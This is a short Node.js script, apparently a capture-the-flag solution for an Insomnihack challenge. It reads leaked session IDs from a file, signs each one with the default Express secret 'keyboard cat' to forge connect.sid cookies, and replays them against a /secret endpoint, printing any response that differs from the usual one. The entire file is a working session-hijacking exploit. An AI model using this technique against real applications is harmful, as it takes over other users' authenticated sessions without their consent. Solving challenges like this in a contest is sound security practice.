const cookie = require("cookie-signature");
const fs = require("fs");
const readline = require("readline");
const request = require("request");

const rl = readline.createInterface({
  input: fs.createReadStream("debug"),
  crlfDelay: Infinity
});


rl.on("line", (line) => {
  session = line.slice(0, -5);
  var signed = cookie.sign(session, "keyboard cat")

  const options = {
    url: "http://secretus.insomnihack.ch/secret",
    headers: {
      "Authorization": "secret",
      "Cookie": "connect.sid=s%3A" + signed
    }
  };

  function callback(error, response, body) {
    if (response && response.headers["content-length"] != 1973)
      console.log(body)
  }
  request(options, callback);
});
